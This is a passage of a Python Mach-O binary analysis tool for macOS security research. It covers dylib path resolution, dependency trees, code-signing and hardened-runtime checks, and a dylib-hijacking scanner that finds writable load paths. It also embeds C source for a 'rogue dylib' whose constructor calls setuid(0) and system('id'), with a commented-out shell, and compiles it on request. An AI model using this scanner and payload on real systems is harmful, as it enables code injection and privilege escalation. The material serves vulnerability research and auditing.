                path = path.replace('@executable_path', executable_path)
                absolute_paths[name].append(path)
            
            elif path.startswith('@rpath'):
                paths = self.resolveRunPathPaths(path)
                absolute_paths[name].extend(paths)
                
            elif path.startswith('@loader_path'):
                path = path.replace('@loader_path', loader_path)
                absolute_paths[name].append(path)
                
            else:
                absolute_paths[name].append(path)
                
        return absolute_paths
    
    def checkBrokenRelativeDylibSource(self):
        '''
        Check for bad dylib source.
        When Dylib is relative, but does not use @executable_path | @loader_path | @rpath.
        For example: mylib.dylib instead of @executable_path/mylib.dylib
        '''
        broken_relative_dylibs = []
        for _, paths in self.absolute_paths.items(): # Iterate dylibs:paths dictionary
            for path in paths:
                if not path.startswith('/'):
                    broken_relative_dylibs.append(path)
            
        return broken_relative_dylibs

    def checkIfPathExists(self, path):
        '''Check if specified path exists on the filesystem.'''
        return os.path.exists(path)

    def checkIfPathExistsInDyldSharedCache(self, path, extracted_dyld_share_cache_directory_path):
        '''Return if the path exists in the DSC - you must first extract it.'''
        path = os.path.abspath(extracted_dyld_share_cache_directory_path) + "/" + path
        return self.checkIfPathExists(path)

    def runDyldSharedCacheExtractor(self, dyld_share_cache_path, extracted_output_path):
        '''Run dyld-shared-cache-extractor command.'''
        command = ['dyld-shared-cache-extractor', dyld_share_cache_path, extracted_output_path]
        subprocess.run(command, check=True)

    def getDylibTree(self, dyld_share_cache_path=None, extracted_output_path=None, is_extracted=0):
        '''A function that inspects the dynamic dependencies of a Mach-O binary recursively (like recursive otool -L). You must use absolute path in --path if you are using --dylibtree from extracted Dyld Shared Cache.'''
        if dyld_share_cache_path in [None, '']:
            dyld_share_cache_path = self.dyld_share_cache_path

        if extracted_output_path in [None, '']:
            extracted_output_path = 'extracted_dyld_share_cache/'
        extracted_output_path = os.path.abspath(extracted_output_path) # Convert to absolute path

        if is_extracted == '0':
            self.runDyldSharedCacheExtractor(dyld_share_cache_path, extracted_output_path)

        dylibtree = treelib.Tree()
        path_to_process = [self.file_path]
        already_checked_paths = []
        not_existing_paths = [] # It could be the already_checked_paths for optimization, but for code clarity it stay.
        node_id = 0
        dylibtree.create_node(self.file_path, node_id)
        
        while path_to_process:
            current_path = path_to_process.pop()
            
            if (current_path not in path_to_process) and (current_path not in already_checked_paths) and (current_path not in not_existing_paths):
                fat_binary = lief.MachO.parse(current_path)
                dylib_snake_instance = SnakeIV(fat_binary, current_path)
                
                if current_path.startswith(extracted_output_path): 
                    current_path = current_path.removeprefix(extracted_output_path)
                
                for _, dylib_paths in dylib_snake_instance.absolute_paths.items():
                    for path in dylib_paths: # All dylibs for current binary (current_path from existing_path_to_process)
                        absolute_path = os.path.abspath(path)
                        node_id += 1
                        filtered_nodes = list(dylibtree.filter_nodes(lambda node: node.tag == current_path))
                        nid_of_first_occurance_of_dylib_in_dylibtree = filtered_nodes[0].identifier
                        # If path exist on the filesystem or DSC, add as a leaf to tree
                        ## current_path(root) -> absolute_path(leaf)
                        if absolute_path not in path_to_process:
                            if dylib_snake_instance.checkIfPathExists(absolute_path):
                                path_to_process.append(absolute_path) # Add this path to process recursively in while loop
                                dylibtree.create_node(absolute_path, node_id, parent=nid_of_first_occurance_of_dylib_in_dylibtree) # Add a path as a leaf
                            elif dylib_snake_instance.checkIfPathExistsInDyldSharedCache(path, extracted_output_path):
                                dsc_path = extracted_output_path + path
                                path_to_process.append(dsc_path)
                                dylibtree.create_node(absolute_path, node_id, data='\033[94mDSC\033[0m',  parent=nid_of_first_occurance_of_dylib_in_dylibtree) # Add a path as a leaf
                            else:
                                not_existing_paths.append(absolute_path)
                                dylibtree.create_node(absolute_path, node_id, data='\033[91mWARNING - not existing path\033[0m',  parent=nid_of_first_occurance_of_dylib_in_dylibtree)

                # If the node path (current_path) was checked, it should not be unwind again.
                already_checked_paths.append(current_path)
                already_checked_paths.append(extracted_output_path + current_path)
        
        return dylibtree 
    
    def getDylibID(self):
        '''
        Return a LC_ID_DYLIB Load Command if exists.
        Dyld additionally check if the FILE TYPE == MH_DYLIB.
        I intentionally omit this step to always extract ID.
        '''
        for cmd in self.load_commands:
            if cmd.command.name == 'ID_DYLIB':
                return cmd
        return None
    
    def getPathFromDylibID(self):
        '''Return a path stored inside the Dylib ID Load Command.'''
        dylib_id_lc = self.getDylibID()
        if dylib_id_lc:
            return self.extractPathFromDylibLoadCommandStruct(dylib_id_lc)
        return None
        
    def printTreeFromTreelib(self, tree):
        '''
        Helper function for printing the dylibtree. 
        It will only work with this structure because the root id is equal to 0 (tree.get_node(0)), which is not always true.
        I had to write this to make pretty printing with data work because, by default, tree limb does not support printing with data.
        Data is needed to show warnings if any library is missing on the filesystem and to inform if the library was from Dyld Share Cachce.
        '''
        def recursivePrint(node, prefix="", last=True):
            data_str = f": {node.data}" if node.data else ""
            print(f"{prefix}{'`-- ' if last else '|-- '}{node.tag}{data_str}")
            
            children = tree.children(node.identifier)
            count = len(children)
            
            for i, child in enumerate(children):
                is_last = i == count - 1
                child_prefix = f"{prefix}{'    ' if last else '|   '}"
                recursivePrint(child, child_prefix, is_last)

        root = tree.get_node(0)
        recursivePrint(root)

    def printDylibs(self):
        print(f"{self.file_path} depends on libraries:")
        for d in self.getSharedLibraries(only_names=False):
            print(f"\t{d}")
    
    def printRpathsResolved(self):
        '''Print all paths that @rpath can be resolved to.'''
        print(*self.rpath_list, sep="\n")
    
    def printRpathsUnresolved(self):
        print(*self.getUnresolvedRunPathLoadCommandsPaths(), sep="\n")
        
    def printResolvedDylibPaths(self):
        '''Prints all resolved (absolute) dylib loading commands paths.'''
        for _, dylib_paths in self.absolute_paths.items():
            print(*dylib_paths, sep='\n')
                    
    def printUnresolvedDylibPaths(self):
        '''Prints all unresolved (with @rpath|@executable_path|@loader_path) dylib loading commands paths.'''
        for dylib_load_command in self.dylib_loading_commands:
            print(self.extractPathFromDylibLoadCommandStruct(dylib_load_command))
            
    def printBrokenRelativePaths(self):
        '''Print 'broken' relative paths from the binary (cases where the dylib source is specified for an executable directory without @executable_path)'''
        for broken_path in self.checkBrokenRelativeDylibSource():
            print(broken_path)

    def getMissingPaths(self):
        '''
        Return two unique lists of missing and existing paths.
        '''
        missing_paths = []
        existing_paths = []
        for _, paths in self.absolute_paths.items():
            for path in paths:
                if os.path.exists(path):
                    existing_paths.append(path)
                    break  # Stop checking further paths for this dylib
                else:
                    missing_paths.append(path)
        unique_missing = list(set(missing_paths))
        unique_existing = list(set(existing_paths))
        return unique_missing, unique_existing
    
    def checkWriteAccessMissing(self, paths):
        '''
        Check write access for the given paths.
        In case the directory does not exists, traverse back till directory that exists and check write access there.
        Return a list of writeable directories.
        '''
        write_accessible_paths = []
        for path in paths:
            current_path = path
            if os.access(current_path, os.W_OK):
                write_accessible_paths.append(path)
                continue
            while current_path:
                current_path = os.path.dirname(current_path)
                if not os.path.exists(current_path):
                    continue
                if os.access(current_path, os.W_OK):
                    write_accessible_paths.append(path)
                    break
                else:
                    break
        
        return write_accessible_paths
    
    def checkWriteAccessExisting(self, paths):
        '''Return a list of write-accessible paths.'''
        write_accessible_paths = []
        for path in paths:
            if os.access(path, os.W_OK):
                write_accessible_paths.append(path)

        return write_accessible_paths

    def hasLibraryValidationFlag(self, file_path):
        '''Check Library validation flag for given binary.'''
        if b'library-validation' in self.getCodeSignature(file_path):
            return True
        return False
    
    def hasDisableLibraryValidationEntitlement(self, file_path):
        '''Checks if the binary has com.apple.security.cs.disable-library-validation or com.apple.private.security.clear-library-validation entitlement set, which allows loading dylibs without requiring code signing.'''
        if self.checkIfEntitlementIsUsed('com.apple.security.cs.disable-library-validation', 'true', file_path) or self.checkIfEntitlementIsUsed('com.apple.private.security.clear-library-validation','true', file_path):
            return True
        return False
    
    def getDyldSharedCacheDylibsPaths(self, dsc_path):
        '''
        Parse Dyld Shared Cache using ipsw to extract dylib paths.
        Ref: https://blacktop.github.io/ipsw/docs/guides/dyld/
        '''
        if dsc_path == None:
            dsc_path = self.dyld_share_cache_path
            
        command = f"ipsw dyld info {dsc_path} -l -j >> /tmp/dyld_shared_cache_temp_1234.json"
        subprocess.run(command, shell=True, check=True)
        
        with open('/tmp/dyld_shared_cache_temp_1234.json', 'r') as file:
            data = json.load(file)
        os.remove('/tmp/dyld_shared_cache_temp_1234.json')
        
        # jq -r '.dylibs[].name' dsc.json
        paths = [dylib['name'] for dylib in data.get('dylibs', [])]
        return paths

    def printDyldSharedCacheDylibsPaths(self, dsc_path):
        '''Print Dyld paths from Dyld Shared Cache.'''
        if dsc_path == None:
            dsc_path = self.dyld_share_cache_path
        
        paths = self.getDyldSharedCacheDylibsPaths(dsc_path)
        for path in paths:
            print(path)
        
    def checkDylibHijackingProtections(self, file_path):
        '''Check protections against dylib hijacking.'''
        
        # Check if 'com.apple.security.cs.disable-library-validation' or 'com.apple.private.security.clear-library-validation' entitlements are present and set to true - INSECURE.
        has_insecure_entitlement = self.hasDisableLibraryValidationEntitlement(file_path)

        # Check if Library validation or Hardened runtime is active - SECURE
        is_hardened_runtime_active = self.hasHardenedRuntimeFlag(file_path)
        is_library_validation_active = self.hasLibraryValidationFlag(file_path)
        
        if has_insecure_entitlement: # Entitlements disables protections
            return False
        elif is_hardened_runtime_active or is_library_validation_active: # If there are no entitlements and HR or LV exists, then protections is ON 
            return True
        else: # If there are no insecure entitlements, but there are also no HR or LV, there are no protections
            return False
    
    def dylibHijackingScanner(self, dyld_share_cache_path):
        '''Direct and Indirect Dylib Hijacking Scanner - return dictionary of results for main binary and each dependancy.'''
        
        if dyld_share_cache_path in [None, '']:
            dyld_share_cache_path = self.dyld_share_cache_path

        dsc_paths = self.getDyldSharedCacheDylibsPaths(dyld_share_cache_path)
        already_checked_paths = []
        all_results = {}
        path_to_process = [self.file_path]
        
        while path_to_process:
            current_path = path_to_process.pop()
            
            result = {
            'is_protected' : bool,
            'writeable_missing_paths' : [],
            'writeable_existing_paths' : []
            }
            
            if (current_path not in already_checked_paths) and (current_path not in dsc_paths):
                fat_binary = lief.MachO.parse(current_path)
                dylib_snake_instance = SnakeIV(fat_binary, current_path)
                
                missing_paths, existing_paths = dylib_snake_instance.getMissingPaths()
                result['writeable_missing_paths'] = dylib_snake_instance.checkWriteAccessMissing(missing_paths)
                result['writeable_existing_paths'] = dylib_snake_instance.checkWriteAccessExisting(existing_paths)
                result['is_protected'] = dylib_snake_instance.checkDylibHijackingProtections(dylib_snake_instance.file_path)
                
                already_checked_paths.append(current_path)
                path_to_process.extend(existing_paths)
                all_results[current_path] = result
        return all_results

    def parseDylibHijackingScannerResults(self, all_results):
        '''Print the dylibHijackingScanner results in a nice format.'''
        for current_path, result in all_results.items():
            if result['is_protected']:
                print(f"{current_path}: \033[92mPROTECTED\033[0m")
            else:
                print(f"{current_path}: \033[91mNOT PROTECTED\033[0m")
            if result['writeable_existing_paths']:
                print(f"\033[91m[!] WRITEABLE EXISTING PATHS\033[0m: {', '.join(map(str, result['writeable_existing_paths']))}")
            if result['writeable_missing_paths']:
                print(f"\033[91m[!] WRITEABLE MISSING PATHS\033[0m: {', '.join(map(str, result['writeable_missing_paths']))}")
            print("-"*28)

    def getReExportLoadCommands(self):
        '''
        Return a list of REEXPORT_DYLIB Load Commands if exists.
        '''
        reexport_load_commands = []
        for cmd in self.load_commands:
            if cmd.command.name == 'REEXPORT_DYLIB':
                reexport_load_commands.append(cmd)
        return reexport_load_commands
    
    def getReExportPaths(self):
        '''Return paths stored inside the REEXPORT_DYLIB Load Commands.'''
        reexport_load_commands = self.getReExportLoadCommands()
        paths = []
        if reexport_load_commands:
            for load_command in reexport_load_commands:
                paths.append(self.extractPathFromDylibLoadCommandStruct(load_command))
        return paths 

    def getImportedSymbols(self, target_library_path):
        '''
            It works on the dylib specified in the --path.
            Returns the imported symbols from the external library (target_library_path)
            DYLIB_ID of the target_library_path must be equal to the path in order to work properly.
            https://lief-project.github.io/doc/stable/api/python/macho.html#binary
            https://lief-project.github.io/doc/stable/api/python/macho.html#binding-info
            https://lief-project.github.io/doc/stable/api/python/macho.html#dylibcommand
        '''
        if target_library_path:
            imported_symbols = []
            for symbol in self.binary.imported_symbols:
                if symbol.binding_info.library.name == target_library_path:
                    imported_symbols.append(symbol.name)
            return imported_symbols
    
    def prepareRogueDylib(self, target_library_path):
        '''
            Compile m.dylib which by default:
                1. Prints log about successful injection to stdout & stderr syslog.
                2. If the binary is SUID, sets RUID to EUID and prints user ID.
        '''
        file_name_c = 'm.c'
        source_code = SourceCodeManager.dylib_hijacking
        output_filename = 'm.dylib'
        flag_list = ['-dynamiclib']
        imported_sybols = self.getImportedSymbols(target_library_path)
        if imported_sybols:
            for symbol in imported_sybols:
                symbol = symbol.lstrip('_')
                function_to_add = f'\nvoid {symbol}(void){{}}'
                source_code += function_to_add
        
        SourceCodeManager.clangCompilerWrapper(file_name_c, source_code, output_filename, flag_list)
### --- ARGUMENT PARSER --- ###  
class ArgumentParser:
    def __init__(self):
        '''Class for parsing arguments from the command line. I decided to remove it from main() for additional readability and easier code maintenance in the VScode'''
        self.parser = argparse.ArgumentParser(description="Mach-O files parser for binary analysis")
        self.addGeneralArgs()
        self.addMachOArgs()
        self.addCodeSignArgs()
        self.addChecksecArgs()
        self.addDylibsArgs()

    def addGeneralArgs(self):
        self.parser.add_argument('-p', '--path', required=True, help="Path to the Mach-O file")

    def addMachOArgs(self):
        macho_group = self.parser.add_argument_group('MACH-O ARGS')
        macho_group.add_argument('--file_type', action='store_true', help="Print binary file type")
        macho_group.add_argument('--header_flags', action='store_true', help="Print binary header flags")
        macho_group.add_argument('--endian', action='store_true', help="Print binary endianess")
        macho_group.add_argument('--header', action='store_true', help="Print binary header")
        macho_group.add_argument('--load_commands', action='store_true', help="Print binary load commands names")
        macho_group.add_argument('--segments', action='store_true', help="Print binary segments in human-friendly form")
        macho_group.add_argument('--sections', action='store_true', help="Print binary sections in human-friendly form")
        macho_group.add_argument('--symbols', action='store_true', help="Print all binary symbols")
        macho_group.add_argument('--chained_fixups', action='store_true', help="Print Chained Fixups information")
        macho_group.add_argument('--exports_trie', action='store_true', help="Print Export Trie information")
        macho_group.add_argument('--uuid', action='store_true', help="Print UUID")
        macho_group.add_argument('--main', action='store_true', help="Print entry point and stack size")
        macho_group.add_argument('--encryption_info', nargs='?',const='', help="Print encryption info if any. Optionally specify an output path to dump the encrypted data (if cryptid=0, data will be in plain text)", metavar="(optional) save_path.bytes")
        macho_group.add_argument('--strings_section', action='store_true', help="Print strings from __cstring section")
        macho_group.add_argument('--all_strings', action='store_true', help="Print strings from all sections")
        macho_group.add_argument('--save_strings', help="Parse all sections, detect strings, and save them to a file", metavar='all_strings.txt')
        macho_group.add_argument('--info', action='store_true', default=False, help="Print header, load commands, segments, sections, symbols, and strings")

    def addCodeSignArgs(self):
        codesign_group = self.parser.add_argument_group('CODE SIGNING ARGS')
        codesign_group.add_argument('--verify_signature', action='store_true', default=False, help="Code Signature verification (if the contents of the binary have been modified)")
        codesign_group.add_argument('--cd_info', action='store_true', default=False, help="Print Code Signature information")
        codesign_group.add_argument('--cd_requirements', action='store_true', default=False, help="Print Code Signature Requirements")
        codesign_group.add_argument('--entitlements', help="Print Entitlements in a human-readable, XML, or DER format (default: human)", nargs='?', const='human', metavar='human|xml|var')
        codesign_group.add_argument('--extract_cms', help="Extract CMS Signature from the Code Signature and save it to a given file", metavar='cms_signature.der')
        codesign_group.add_argument('--extract_certificates', help="Extract Certificates and save them to a given file. To each filename will be added an index at the end:  _0 for signing, _1 for intermediate, and _2 for root CA certificate", metavar='certificate_name')
        codesign_group.add_argument('--remove_sig', help="Save the new file on a disk with removed signature", metavar='unsigned_binary')
        codesign_group.add_argument('--sign_binary', help="Sign binary using specified identity - use : 'security find-identity -v -p codesigning' to get the identity (default: adhoc)", nargs='?', const='adhoc', metavar='adhoc|identity_number')
    
    def addChecksecArgs(self):
        checksec_group = self.parser.add_argument_group('CHECKSEC ARGS')
        checksec_group.add_argument('--has_pie', action='store_true', default=False, help="Check if Position-Independent Executable (PIE) is set")
        checksec_group.add_argument('--has_arc', action='store_true', default=False, help="Check if Automatic Reference Counting (ARC) is in use (can be false positive)")
        checksec_group.add_argument('--is_stripped', action='store_true', default=False, help="Check if binary is stripped")
        checksec_group.add_argument('--has_canary', action='store_true', default=False, help="Check if Stack Canary is in use (can be false positive)")
        checksec_group.add_argument('--has_nx_stack', action='store_true', default=False, help="Check if stack is non-executable (NX stack)")
        checksec_group.add_argument('--has_nx_heap', action='store_true', default=False, help="Check if heap is non-executable (NX heap)")
        checksec_group.add_argument('--has_xn', action='store_true', default=False, help="Check if binary is protected by eXecute Never (XN) ARM protection")
        checksec_group.add_argument('--is_notarized', action='store_true', default=False, help="Check if the application is notarized and can pass the Gatekeeper verification")
        checksec_group.add_argument('--is_encrypted', action='store_true', default=False, help="Check if the application is encrypted (has LC_ENCRYPTION_INFO(_64) and cryptid set to 1)")
        checksec_group.add_argument('--has_restrict', action='store_true', default=False, help="Check if binary has __RESTRICT segment")
        checksec_group.add_argument('--is_hr', action='store_true', default=False, help="Check if the Hardened Runtime is in use")
        checksec_group.add_argument('--is_as', action='store_true', default=False, help="Check if the App Sandbox is in use")
        checksec_group.add_argument('--is_fort', action='store_true', default=False, help="Check if the binary is fortified")
        checksec_group.add_argument('--has_rpath', action='store_true', default=False, help="Check if the binary utilise any @rpath variables")
        checksec_group.add_argument('--checksec', action='store_true', default=False, help="Run all checksec module options on the binary")
        
    def addDylibsArgs(self):
        dylibs_group = self.parser.add_argument_group('DYLIBS ARGS')
        dylibs_group.add_argument('--dylibs', action='store_true', default=False, help="Print shared libraries used by specified binary with compatibility and the current version (loading paths unresolved, like @rpath/example.dylib)")
        dylibs_group.add_argument('--rpaths', action='store_true', default=False, help="Print all paths (resolved) that @rpath can be resolved to")
        dylibs_group.add_argument('--rpaths_u', action='store_true', default=False, help="Print all paths (unresolved) that @rpath can be resolved to")
        dylibs_group.add_argument('--dylibs_paths', action='store_true', default=False, help="Print absolute dylib loading paths (resolved @rpath|@executable_path|@loader_path) in order they are searched for")
        dylibs_group.add_argument('--dylibs_paths_u', action='store_true', default=False, help="Print unresolved dylib loading paths.")
        dylibs_group.add_argument('--broken_relative_paths', action='store_true', default=False, help="Print 'broken' relative paths from the binary (cases where the dylib source is specified for an executable directory without @executable_path)")
        dylibs_group.add_argument('--dylibtree', metavar=('cache_path,output_path,is_extracted'), nargs = '?', const=",,0", help='Print the dynamic dependencies of a Mach-O binary recursively. You can specify the Dyld Shared Cache path in the first argument, the output directory as the 2nd argument, and if you have already extracted DSC in the 3rd argument (0 or 1). The output_path will be used as a base for dylibtree. For example, to not extract DSC, use: --dylibs ",,1", or to extract from default to default use just --dylibs or --dylibs ",,0" which will extract DSC to extracted_dyld_share_cache/ in the current directory')
        dylibs_group.add_argument('--dylib_id', action='store_true', default=False, help="Print path from LC_ID_DYLIB")
        dylibs_group.add_argument('--reexport_paths', action='store_true', default=False, help="Print paths from LC_REEXPORT_DLIB")
        dylibs_group.add_argument('--hijack_sec', action='store_true', default=False, help="Check if binary is protected against Dylib Hijacking")
        dylibs_group.add_argument('--dylib_hijacking', metavar='cache_path' ,nargs="?", const="default", help="Check for possible Direct and Indirect Dylib Hijacking loading paths. (optional) Specify the path to the Dyld Shared Cache")
        dylibs_group.add_argument('--prepare_dylib', metavar='target_dylib_path' ,nargs="?", const="default", help="Compile rogue dylib. (optional) Specify target_dylib_path, it will search for the imported symbols from it in the dylib specified in the --path argument and automatically add it to the source code of the rogue lib. Example: --path lib1.dylib --prepare_dylib /path/to/lib2.dylib")
        
        
        
    def parseArgs(self):
        return self.parser.parse_args()

    def printAllArgs(self, args):
        '''Just for debugging. This method is a utility designed to print all  parsed arguments and their corresponding values.'''
        for arg, value in vars(args).items():
            print(f"{arg}: {value}")
### --- SOURCE CODE --- ### 
class SourceCodeManager:
    dylib_hijacking = r'''
// clang -dynamiclib m.c -o m.dylib //-o $PWD/TARGET_DYLIB 
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    syslog(LOG_ERR, "[+] m.dylib injected in %s\n", argv[0]);
    printf("[+] m.dylib injected in %s\n", argv[0]);
    setuid(0);
    system("id");
    //system("/bin/sh");
}
'''
    @staticmethod
    def clangCompilerWrapper(file_name_c, source_code, output_filename, flag_list=None):
        # Save the source code to a file
        with open(file_name_c, "w") as source_file:
            source_file.write(source_code)

        # Compile the source code using clang
        clang_command = ["clang", file_name_c, "-o", output_filename, *flag_list]
        subprocess.run(clang_command, check=True)
    
if __name__ == "__main__":
    arg_parser = ArgumentParser()
    args = arg_parser.parseArgs()
    
    file_path = os.path.abspath(args.path)
    
    ### --- I. MACH-O --- ###
    macho_processor = MachOProcessor(file_path)
    macho_processor.process()
    
    ### --- II. CODE SIGNING --- ###
    code_signing_processor = CodeSigningProcessor()
    code_signing_processor.process()
    
    ### --- III. CHECKSEC --- ###
    checksec_processor = ChecksecProcessor()
    checksec_processor.process()
    
    ### --- IV. DYLIBS --- ###
    dylibs_processor = DylibsProcessor()
    dylibs_processor.process()